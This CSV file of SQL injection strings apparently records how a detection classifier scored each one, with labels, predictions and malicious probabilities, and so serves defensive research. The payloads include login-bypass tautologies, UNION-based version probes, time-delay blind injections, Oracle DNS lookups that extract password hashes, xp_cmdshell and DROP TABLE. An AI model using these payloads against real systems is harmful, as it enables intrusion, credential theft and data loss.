Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9762815569853676
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9942929465316022
 and 1 in   (  select var from temp  )  --,1,1,True,0.936622237418432
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9947247557675158
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
or x  =  x,1,1,True,0.781186889540348
or a  =  a,1,1,True,0.7137377455912577
or '1'  =  '1,1,1,True,0.9996083495385886
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,1,True,0.9758425828294757
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,1,True,0.977986227466406
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,1,True,0.9954837051192525
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,1,True,0.9951236362934707
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.9346972711744796
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,1,True,0.9998572583354693
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,1,True,0.9883324458666042
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,1,True,0.9685293350223131
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,1,True,0.9945272644494847
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9781929256214682
a' or 1  =  1--,1,1,True,0.9979358135817231
 )   or   (  a  =  a,1,1,True,0.6257423864759626
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,1,True,0.5497438762901101
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1,True,0.9930379156953407
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,1,True,0.9945272644494847
-- &password  = ,1,1,True,0.9983218088445117
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,1,True,0.9883324458666042
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,1,True,0.9816459217583641
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,1,True,0.9767544628935392
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1,True,0.8462516047532327
 or '1'  =  '1,1,1,True,0.9992181649337925
admin' or 1  =  1,1,1,True,0.9999932793356487
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,1,True,0.9827768869403692
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,1,True,0.9731605582493839
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,1,True,0.9680114315974222
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,1,True,0.9839122405959937
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,1,True,0.8381171313067148
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,1,True,0.9743788616754852
 or 1  =  1--,1,1,True,0.9968279568630027
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.8632652927308287
pg_sleep  (  __TIME__  )  --,1,1,True,0.9928580699238846
‘ or 3  =  3 --,1,1,True,0.9397127172952068
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,1,True,0.980865050636958
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
 )   union select * from information_schema.tables;,1,1,True,0.9638198065955179
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,1,True,0.9839122405959937
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9621511138941556
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,1,True,0.9871956141213295
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.9357635022695472
""" or """" """,1,1,True,0.695535719226054
delete,1,1,True,0.7491897932965208
;waitfor delay '0:0:__TIME__'--,1,1,True,0.9860417827429137
 or 1  =  1 --,1,1,True,0.9977590770826128
1' and non_existant_table   =   '1,1,1,True,0.9478631375753714
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,1,True,0.9839122405959937
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,1,True,0.9947817592902898
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,1,True,0.8195517832315516
x' AND userid IS NULL; --,1,1,True,0.9999155112020517
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9950170690901722
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,1,True,0.9685293350223131
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,1,True,0.9816272204104772
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,1,True,0.9528385446538303
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.9562614118118714
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,1,True,0.9824038943497441
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,1,True,0.9825221716703023
UNION ALL SELECT,1,1,True,0.9994291978322571
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,1,True,0.9875840422572653
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,1,True,0.985369776424872
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9796435370867695
x' or full_name like '%bob%,1,1,True,0.8824620211241336
x' and members.email is NULL; --,1,1,True,0.9981773867338145
 or 2 > 1,1,1,True,0.7247957173318195
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,1,True,0.9879537119745907
"""  )   or pg_sleep  (  __TIME__  )  --",1,1,True,0.9915353387415042
 ',1,1,True,0.9390491773772047
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,1,True,0.9713667926623787
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,1,True,0.9839122405959937
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,1,True,0.9857771924556555
 )   or sleep  (  __TIME__  )    =  ',1,1,True,0.8561414078657633
sleep 50',1,1,True,0.9356367938701226
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9949652479138948
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,1,True,0.9864806583318763
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,1,True,0.9900186006944252
or sleep  (  __TIME__  )    =  ',1,1,True,0.8716855665704599
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,1,True,0.9743788616754852
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1,True,0.9685293350223131
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,1,True,0.9655482715475519
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,1,True,0.9635529599093274
or 2 > 1,1,1,True,0.7409415331123421
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,1,True,0.8582269216743128
anything' OR 'x'  =  'x,1,1,True,0.9999820057269164
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,1,True,0.9713667926623787
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9752613005956327
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9652760925742248
&',1,1,True,0.7703629730729482
a' or 3  =  3--,1,1,True,0.9703375483946753
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,1,True,0.9949391552003441
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9790586282184576
"admin""or 1  =  1 or """"  =  """,1,1,True,0.9998455830435037
uni/**/on sel/**/ect,1,1,True,0.9987890230902385
""" or """"&""",1,1,True,0.695535719226054
 )    )   ;waitfor delay '0:0:__TIME__'--,1,1,True,0.9882077409650142
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
1 waitfor delay '0:0:10'--,1,1,True,0.9869795185934271
bfilename,1,1,True,0.7491883879113401
admin'  )   or   (  '1'  =  '1'--,1,1,True,0.9999998759975558
UEf,1,1,True,0.7568312845762646
 -- &password  = ,1,1,True,0.9992219277286677
1 or sleep  (  __TIME__  )  #,1,1,True,0.9377416742534506
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.935621219965381
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,1,True,0.9950791686110021
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,1,True,0.9941684034351926
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,1,True,0.989447319059209
or sleep  (  __TIME__  )  #,1,1,True,0.9321658668458583
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.8460153644879018
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,1,True,0.9858851264164779
||6,1,1,True,0.8956836369549792
or 1/*,1,1,True,0.9887812416248803
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,1,True,0.9178994896712743
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,1,True,0.9877419880019476
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,1,True,0.9827768869403692
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9766921278005507
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
" or 1  =  1 or """"  =  ",1,1,True,0.8470363025697673
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.8992854762111812
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1,True,0.9857771924556555
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9780113204041526
or 'whatever' in   (  'whatever'  ) ,1,1,True,0.8903958196971351
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,1,True,0.7161863769663571
select * from users where id  =  '1'   or 1  =  1 -- 1',1,1,True,0.9988401521667074
?,1,1,True,0.7703629730729482
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,1,True,0.9825031280147515
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,1,True,0.9953643392658341
"admin""  )   or   (  ""1""  =  ""1""#",1,1,True,0.9998929330284151
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,1,True,0.988282668053982
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,1,True,0.9825221716703023
 or '' ',1,1,True,0.9726812623645474
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
or 1  =  1,1,1,True,0.9025334949903295
 ; drop table temp --,1,1,True,0.9969831220131763
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.8996504338930604
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.963710392887406
""" or ""x""  =  ""x",1,1,True,0.5681353842176236
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,1,True,0.9983251448936059
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,1,True,0.9670740774106276
 or 'something' like 'some%',1,1,True,0.766344520402806
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,1,True,0.9194144000372275
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.8972914979583594
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,1,True,0.9984544945542554
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,True,0.9748788501254149
admin' or '1'  =  '1'--,1,1,True,0.9999999121669213
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,1,True,0.9213118344817287
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.9360185044666659
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9743483386755125
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,1,True,0.9695935350468594
""";waitfor delay '0:0:__TIME__'--",1,1,True,0.9860417827429137
x' and userid is NULL; --,1,1,True,0.9992245053991055
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,1,True,0.9988774796431614
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,1,True,0.9654821238377911
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,1,True,0.9847119869353628
’ or ‘1’  =  ’1,1,1,True,0.5681353842176236
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9947247557675158
admin'or 1  =  1 or ''  =  ',1,1,True,0.9999820892593138
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,1,True,0.9947102000185372
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,1,True,0.8748209875884051
exec  (  @s  ) ,1,1,True,0.6801328549775275
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1,True,0.9839122405959937
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9707117556722346
 or 1  =  1,1,1,True,0.8728397317694268
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,1,True,0.986544002694047
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9697047652540293
x' AND email IS NULL; --,1,1,True,0.9999549350761502
